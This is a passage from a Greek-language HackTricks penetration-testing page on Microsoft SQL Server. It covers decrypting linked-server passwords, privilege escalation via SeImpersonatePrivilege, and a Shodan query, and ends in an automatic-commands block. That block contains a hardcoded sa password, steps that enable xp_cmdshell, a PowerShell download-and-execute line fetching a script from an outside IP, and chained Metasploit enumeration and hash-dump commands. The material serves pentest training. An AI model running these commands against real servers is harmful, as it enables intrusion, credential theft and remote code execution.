2. Προσθέστε μια παράμετρο Start Up — σε αυτή την περίπτωση θα προστεθεί ένα trace flag, το -T7806.
3. Ενεργοποιήστε το remote admin connection.

Για να αυτοματοποιήσετε αυτές τις ρυθμίσεις, [this repository ](https://github.com/IamLeandrooooo/SQLServerLinkedServersPasswords/) περιέχει τα απαραίτητα scripts. Εκτός από ένα powershell script για κάθε βήμα της διαμόρφωσης, το repository περιέχει επίσης ένα πλήρες script που συνδυάζει τα configuration scripts και την εξαγωγή και αποκρυπτογράφηση των κωδικών.

Για περισσότερες πληροφορίες, ανατρέξτε στους παρακάτω συνδέσμους σχετικά με αυτήν την επίθεση: [Decrypting MSSQL Database Link Server Passwords](https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-database-link-server-passwords/)

[Troubleshooting the SQL Server Dedicated Administrator Connection](https://www.mssqltips.com/sqlservertip/5364/troubleshooting-the-sql-server-dedicated-administrator-connection/)

## Τοπική Ανύψωση Δικαιωμάτων

Ο χρήστης που τρέχει τον MSSQL server θα έχει ενεργοποιημένο το privilege token **SeImpersonatePrivilege.**\
Πιθανώς θα μπορείτε να **ανεβείτε σε Administrator** ακολουθώντας μία από αυτές τις 2 σελίδες:


{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/juicypotato.md
{{#endref}}

## Shodan

- `port:1433 !HTTP`

## Αναφορές

- [Unit 42 – Phantom Taurus: WMI-driven direct SQL collection via batch/sqlcmd](https://unit42.paloaltonetworks.com/phantom-taurus/)
- [https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users](https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users)
- [https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/](https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/)
- [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
- [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
- [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
- [https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/](https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/)
- [https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)
- [https://mayfly277.github.io/posts/GOADv2-pwning-part12/](https://mayfly277.github.io/posts/GOADv2-pwning-part12/)
- [https://exploit7-tr.translate.goog/posts/sqlserver/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp](https://exploit7-tr.translate.goog/posts/sqlserver/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp)


- [https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users](https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users)
- [https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/](https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/)
- [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
- [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
- [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
- [https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/](https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/)
- [https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)
- [https://mayfly277.github.io/posts/GOADv2-pwning-part12/](https://mayfly277.github.io/posts/GOADv2-pwning-part12/)
- [https://exploit7-tr.translate.goog/posts/sqlserver/?\_x_tr_sl=es&\_x_tr_tl=en&\_x_tr_hl=en&\_x_tr_pto=wapp](https://exploit7-tr.translate.goog/posts/sqlserver/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp)

## HackTricks Αυτόματες Εντολές
```
Protocol_Name: MSSQL    #Protocol Abbreviation if there is one.
Port_Number:  1433     #Comma separated if there is more than one.
Protocol_Description: Microsoft SQL Server         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MSSQL
Note: |
Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet).

#sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G

###the goal is to get xp_cmdshell working###
1. try and see if it works
xp_cmdshell `whoami`
go

2. try to turn component back on
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell `whoami`
go

3. 'advanced' turn it back on
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell 'whoami'
go




xp_cmdshell "powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')"


https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html

Entry_2:
Name: Nmap for SQL
Description: Nmap with SQL Scripts
Command: nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}

Entry_3:
Name: MSSQL consolesless mfs enumeration
Description: MSSQL enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS {IP}; set RPORT <PORT>; run; exit' &&msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS {IP}; set RPORT <PORT>; run; exit'

```
{{#include ../../banners/hacktricks-training.md}}
